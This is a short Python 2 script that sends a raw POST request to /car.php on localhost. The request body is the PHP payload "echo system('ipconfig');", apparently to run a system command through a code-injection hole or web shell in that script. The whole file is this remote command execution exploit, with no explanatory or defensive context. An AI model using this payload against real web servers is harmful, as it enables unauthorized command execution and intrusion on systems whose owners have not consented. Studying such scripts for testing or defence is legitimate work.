#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'


import httplib, urllib

httpClient = None
try:
    url="/car.php"
    exp="echo system('ipconfig');"
    #params = urllib.urlencode({"username":"xxx"})
    headers = {"Content-type": "application/x-www-form-urlencoded"
                    , "Accept": "text/plain",
               "Content-length":'%d'%(len("echo system('ipconfig');"))}
    httpClient = httplib.HTTPConnection("localhost", 80, timeout=30)
    httpClient.request("POST", url,headers=headers)
    httpClient.send(exp)
    response = httpClient.getresponse()
    print response.read()
except Exception, e:
    print e
finally:
    if httpClient:
        httpClient.close()